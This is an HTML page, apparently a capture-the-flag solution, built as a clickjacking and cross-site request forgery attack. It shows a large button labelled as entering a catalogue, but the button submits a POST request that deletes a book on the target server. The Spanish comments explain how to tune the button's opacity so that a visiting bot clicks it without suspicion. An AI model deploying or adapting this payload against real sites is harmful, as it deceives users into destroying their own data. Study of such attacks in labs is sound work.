<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>Clickjacking Direct Attack</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #f4f4f4;
            font-family: sans-serif;
        }

        /* Hacemos que el formulario sea el centro del ataque */
        #ataque {
            position: relative;
        }

        /* El botón que el bot buscará */
        #objetivo {
            /* Dimensiones grandes para que el bot lo encuentre fácilmente */
            width: 400px;
            height: 400px;
            
            /* Estilo para que parezca un botón normal o sea invisible */
            background-color: #ff0000;
            color: white;
            border: none;
            border-radius: 10px;
            font-size: 24px;
            font-weight: bold;
            cursor: pointer;
            
            /* Cambia opacity a 0.0001 para que el bot no sospeche, 
               pero que siga siendo 'clicable' */
            opacity: 0.8; 
            
            transition: transform 0.2s;
        }

        #objetivo:hover {
            transform: scale(1.05);
        }

        .mensaje {
            position: absolute;
            top: -50px;
            width: 100%;
            text-align: center;
            color: #333;
        }
    </style>
</head>
<body>

    <div class="mensaje">
        <h2>Cargando contenido...</h2>
    </div>

    <form id="ataque" action="https://ctf.fap.hispasec.com:8018/books/1/delete" method="POST">
        
        <button id="objetivo" type="submit">
            ENTRAR AL CATÁLOGO
        </button>
        
    </form>

    <script>
        // Opcional: Log para verificar en consola si el botón existe
        console.log("Esperando la interacción del bot en el elemento #objetivo");
    </script>

</body>
</html>
